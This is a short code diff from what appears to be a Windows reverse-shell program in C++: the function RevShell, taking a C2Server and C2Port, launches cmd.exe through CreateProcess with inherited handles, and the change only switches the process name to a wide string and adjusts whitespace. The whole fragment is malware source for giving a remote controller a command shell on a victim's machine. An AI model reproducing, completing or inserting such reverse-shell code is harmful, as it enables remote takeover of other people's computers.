@@ -61,7 +61,7 @@ void RevShell(char* C2Server, int C2Port)
 			}
 			else {
 				std::cout << "[DBG] 3\n";
-				char Process[] = "cmd.exe";
+				wchar_t Process[] = L"cmd.exe";
 				STARTUPINFO sinfo;
 				PROCESS_INFORMATION pinfo;
 				memset(&sinfo, 0, sizeof(sinfo));
@@ -77,7 +77,7 @@ void RevShell(char* C2Server, int C2Port)
 				std::cout << "[DBG] 6\n";
 				CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
 				WaitForSingleObject(pinfo.hProcess, INFINITE);
-
+				
 				std::cout << "[DBG] 7\n";
 				CloseHandle(pinfo.hProcess);
 				CloseHandle(pinfo.hThread);
